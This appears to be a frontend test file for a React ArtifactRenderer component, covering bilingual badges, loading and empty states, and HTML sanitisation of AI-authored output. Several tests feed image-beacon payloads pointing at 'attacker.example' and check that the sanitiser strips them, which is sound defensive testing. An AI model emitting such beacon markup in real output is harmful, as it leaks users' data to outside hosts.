/**
 * ArtifactRenderer — wave ARTIFACT-RICHNESS tests.
 *
 * Verifies the cockpit-side chrome around a server-rendered artifact:
 *  - bilingual sw/en classification badge + disclaimer
 *  - audit hash tail and ISO timestamp in the footer
 *  - skeleton state when isLoading
 *  - empty state copy + retry CTA when emptyState is set
 *  - dangerouslySetInnerHTML host elements only carry the supplied
 *    HTML when not in loading / empty mode (no double-render)
 */

import { describe, it, expect, vi } from 'vitest';
import { render, fireEvent, screen } from '@testing-library/react';
import '@testing-library/jest-dom/vitest';

// Imports the eager implementation directly: the public `../ArtifactRenderer`
// is now a `next/dynamic({ ssr: false })` lazy wrapper (to keep DOMPurify out
// of the route-entry bundle), which would only paint its fallback in a
// synchronous test render. The chrome under test lives in the impl.
import { ArtifactRenderer } from '../ArtifactRendererImpl';

const BASE = {
  title: 'Quarterly Brief',
  tenantTradingName: 'Acme Mining Co.',
  classification: 'internal' as const,
  auditHashTail: 'abcd1234',
  renderedAtUtc: '2026-05-29T10:00:00Z',
  authorDisplayName: 'Borjie brain',
};

describe('ArtifactRenderer chrome', () => {
  it('shows English classification + disclaimer when language=en', () => {
    render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml="<p>Body.</p>"
      />,
    );
    expect(screen.getByText('Internal')).toBeInTheDocument();
    expect(
      screen.getByText('AI-generated. Decisions are yours.'),
    ).toBeInTheDocument();
    expect(screen.getByText(/audit:abcd1234/)).toBeInTheDocument();
  });

  it('shows Swahili classification + disclaimer when language=sw', () => {
    render(
      <ArtifactRenderer
        {...BASE}
        language="sw"
        bodyHtml="<p>Body.</p>"
      />,
    );
    expect(screen.getByText('Ndani ya Kampuni')).toBeInTheDocument();
    expect(
      screen.getByText('Imeundwa na akili-bandia. Maamuzi ni yako.'),
    ).toBeInTheDocument();
  });

  it('renders body html host when not loading and not empty', () => {
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml="<p data-test='b'>Hello</p>"
      />,
    );
    expect(container.querySelector('.borjie-artifact-body-host')).toBeInTheDocument();
    expect(container.querySelector('[data-test="b"]')).toBeInTheDocument();
  });

  it('renders TOC and footnotes hosts when supplied', () => {
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml="<p>b</p>"
        tocHtml="<nav class='borjie-toc'><h2>Table of contents</h2><ol><li>A</li></ol></nav>"
        footnotesHtml="<section class='borjie-footnotes'><h2>Evidence</h2></section>"
      />,
    );
    expect(container.querySelector('.borjie-artifact-toc-host')).toBeInTheDocument();
    expect(container.querySelector('.borjie-artifact-footnotes-host')).toBeInTheDocument();
    expect(screen.getByText('Table of contents')).toBeInTheDocument();
    expect(screen.getByText('Evidence')).toBeInTheDocument();
  });

  it('shows loading skeleton when isLoading=true', () => {
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml="<p>b</p>"
        isLoading
      />,
    );
    expect(container.querySelector('.borjie-artifact-skeleton')).toBeInTheDocument();
    expect(container.querySelector('.borjie-artifact-body-host')).not.toBeInTheDocument();
  });

  it('shows empty-state with retry CTA', () => {
    const onRetry = vi.fn();
    render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml=""
        emptyState={{ message: 'No data yet.', onRetry }}
      />,
    );
    expect(screen.getByText('No data yet.')).toBeInTheDocument();
    const btn = screen.getByText('Retry');
    fireEvent.click(btn);
    expect(onRetry).toHaveBeenCalledTimes(1);
  });

  it('uses Swahili retry label when language=sw and no custom label', () => {
    render(
      <ArtifactRenderer
        {...BASE}
        language="sw"
        bodyHtml=""
        emptyState={{ message: 'Hakuna.', onRetry: vi.fn() }}
      />,
    );
    expect(screen.getByText('Jaribu tena')).toBeInTheDocument();
  });

  it('strips remote-resource exfil vectors (img beacon) from AI-authored body', () => {
    // OWASP LLM05: an AI-authored artifact must never be able to beacon out.
    // The sanitiser drops <img> (and src-bearing loaders) so no remote fetch
    // fires when the body paints.
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml={
          '<p>Quarterly numbers.</p>' +
          '<img src="https://attacker.example/beacon?d=secret" alt="x" />' +
          '<a href="https://docs.example/ref">Reference</a>'
        }
      />,
    );
    // The beacon image is gone…
    expect(container.querySelector('img')).not.toBeInTheDocument();
    expect(container.innerHTML).not.toContain('attacker.example');
    // …but legitimate document markup (the anchor, the prose) survives.
    expect(screen.getByText('Quarterly numbers.')).toBeInTheDocument();
    expect(screen.getByText('Reference')).toBeInTheDocument();
  });

  it('strips src-bearing loaders from TOC and footnotes too', () => {
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml="<p>b</p>"
        tocHtml='<nav><img src="https://attacker.example/toc.gif" /><ol><li>A</li></ol></nav>'
        footnotesHtml='<section><img src="https://attacker.example/fn.gif" /></section>'
      />,
    );
    expect(container.querySelector('img')).not.toBeInTheDocument();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('renders the body sanitised on the FIRST frame (no raw-then-clean)', () => {
    // The host must never carry an unsanitised beacon even for one frame:
    // useMemo sanitises during render, so the body host is clean on mount
    // without waiting for an effect. We never flush effects here.
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        language="en"
        bodyHtml={
          '<p>Body.</p><img src="https://attacker.example/firstframe.png" />'
        }
      />,
    );
    const host = container.querySelector('.borjie-artifact-body-host');
    expect(host).toBeInTheDocument();
    expect(host?.innerHTML ?? '').not.toContain('attacker.example');
    expect(host?.querySelector('img')).toBeNull();
  });

  it('reflects the confidential classification on the host element', () => {
    const { container } = render(
      <ArtifactRenderer
        {...BASE}
        classification="confidential"
        language="en"
        bodyHtml="<p>b</p>"
      />,
    );
    const root = container.querySelector('.borjie-artifact');
    expect(root?.getAttribute('data-classification')).toBe('confidential');
    expect(screen.getByText('Confidential')).toBeInTheDocument();
  });
});
